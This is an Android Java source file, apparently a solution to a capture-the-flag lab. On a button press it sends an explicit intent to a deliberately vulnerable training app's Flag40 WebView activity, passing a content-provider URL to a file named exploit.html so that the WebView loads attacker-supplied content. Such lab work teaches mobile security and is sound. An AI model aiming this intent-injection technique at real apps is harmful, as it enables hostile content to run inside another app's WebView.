package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;
import androidx.fragment.app.Fragment;

public class Flag40Fragment extends Fragment {
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag40, container, false);
        
        Button launchButton = view.findViewById(R.id.btnLaunchFlag40);
        
        launchButton.setOnClickListener(v -> {
            // Create an intent to open the file from our content provider with a WebView
            Intent intent = new Intent();
            intent.putExtra("URL", "content://com.appdev.intentattacks.provider/exploit.html");
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag40WebViewsActivity"));
            startActivity(intent);
        });

        return view;
    }
}